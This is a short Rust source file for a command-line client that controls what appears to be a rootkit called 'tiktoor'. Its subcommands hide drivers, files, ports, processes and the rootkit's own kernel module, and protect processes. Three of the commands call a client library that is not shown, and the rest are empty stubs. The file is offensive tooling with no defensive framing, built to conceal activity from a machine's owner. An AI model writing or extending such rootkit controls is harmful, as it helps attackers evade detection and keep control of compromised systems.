use structopt::StructOpt;

/// A CLI tool for communicating with tiktoor
#[derive(StructOpt)]
enum Cli {
    /// Hide driver
    DriverHiding,
    /// Hide file
    FileHiding,
    /// Hide port
    PortHiding,
    /// Hide process
    ProcessHiding {
        /// Process pid
        #[structopt(short, long)]
        pid: u32,
    },
    /// Protect process
    ProcessProtection,
    /// Hide tiktoor module
    ModuleHiding,
    /// Unhide tiktoor module
    ModuleUnhiding,
}

fn main() {
    let cli = Cli::from_args();

    match cli {
        Cli::DriverHiding => {}
        Cli::FileHiding => {}
        Cli::PortHiding => {}
        Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
        Cli::ProcessProtection => {}
        Cli::ModuleHiding => tiktoor_client::hide_module(),
        Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
    }
}
